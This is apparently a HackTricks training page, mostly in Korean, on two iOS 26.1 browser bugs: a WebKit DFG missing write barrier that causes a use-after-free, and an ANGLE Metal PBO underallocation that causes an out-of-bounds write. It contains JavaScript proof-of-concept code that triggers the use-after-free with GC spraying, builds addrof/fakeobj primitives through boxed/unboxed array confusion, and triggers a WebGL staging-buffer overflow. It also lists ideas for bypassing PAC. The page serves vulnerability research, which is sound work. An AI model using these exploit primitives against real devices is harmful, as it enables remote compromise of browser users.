# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## 요약
- **DFG Store Barrier bug (CVE-2025-43529)**: `DFGStoreBarrierInsertionPhase.cpp`에서, **Phi node가 escaped로 표시된 반면 그 Upsilon 입력들은 그렇지 않은 경우** 해당 phase가 이후의 객체 저장들에 대해 **write barrier 삽입을 건너뛰게** 됩니다. GC 압박 하에서 이는 JSC가 아직 도달 가능한 객체들을 해제하게 하여 → **use-after-free**.
- **Exploit target**: **Date** 객체가 butterfly를 materialize하도록 강제(예: `a[0] = 1.1`)해서 butterfly가 해제되고, 이후 배열 요소 저장소로 **reclaimed**되어 boxed/unboxed 혼동을 만들어 → `addrof`/`fakeobj` 원시 획득.
- **ANGLE Metal PBO bug (CVE-2025-14174)**: Metal backend가 실제 텍스처 높이 대신 `UNPACK_IMAGE_HEIGHT`를 사용해 PBO 스테이징 버퍼를 할당합니다. 작은 unpack height를 제공한 뒤 큰 `texImage2D`를 호출하면 **스테이징 버퍼 OOB write**가 발생합니다(아래 PoC에서 약 240KB).
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector`와 JSArray `butterfly`는 PAC 서명이 되어 있어, 공격자가 선택한 포인터로 fake objects를 위조하면 `EXC_BAD_ACCESS`/`EXC_ARM_PAC`로 크래시합니다. 이미 서명된 butterflies만 재사용하는 방식(boxed/unboxed 재해석)만 동작합니다.

## DFG의 누락된 barrier 유발 → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Key points:
- **A**를 old space에 배치하여 generational barriers를 작동시킨다.
- 인덱스된 **Date**를 만들어 **butterfly**가 해제된 타깃이 되게 한다.
- `ArrayBuffer(0x800000)`를 스프레이하여 GC를 강제하고 경쟁 조건을 확대한다.
- Phi/Upsilon escape mismatch가 barrier 삽입을 중단한다; `b.p1 = a`는 **without a write barrier** 상태로 실행되어 GC가 `a`/butterfly를 회수한다.

## Butterfly reclaim → boxed/unboxed confusion
GC가 Date의 butterfly를 해제한 후, 스프레이 배열로 해제된 slab가 서로 다른 element kinds를 가진 두 배열의 elements로 재사용되게 한다:
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
iOS 26.1 (arm64e) 상태:
- **작동:** `addrof`, `fakeobj`, 실행당 20+ address leaks, inline-slot read/write (알려진 inline 필드에서).
- **아직 안정적이지 않음:** inline-slot backings를 통한 generalized `read64`/`write64`.

## arm64e의 PAC 제약 (왜 fake objects가 크래시하는가)
- **TypedArray `m_vector`**와 **JSArray `butterfly`**는 PAC 서명이 되어 있음; 포인터를 위조하면 `EXC_BAD_ACCESS` / 아마도 `EXC_ARM_PAC`가 발생함.
- The confusion primitive는 합법적으로 서명된 butterflies를 재사용하기 때문에 작동함; 서명되지 않은 공격자 포인터를 도입하면 인증에 실패함.
- 가능한 우회 아이디어: auth를 건너뛰는 JIT 경로, 공격자 포인터에 서명하는 gadgets, 또는 ANGLE OOB를 통한 피벗.

## ANGLE Metal PBO 과소할당 → OOB write
작은 unpack height를 사용해 staging buffer를 축소한 다음, 큰 texture를 업로드하여 copy가 범위를 초과하게 함:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
참고:
- `TextureMtl.cpp`의 버그: 스테이징 버퍼가 PBO 경로에서 실제 텍스처 높이 대신 `UNPACK_IMAGE_HEIGHT`를 사용합니다.
- 참조된 프로브에서 WebGL2 PBO 트리거가 구성되어 있으나 iOS 26.1에서는 아직 안정적으로 관찰되지 않습니다.

## References
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
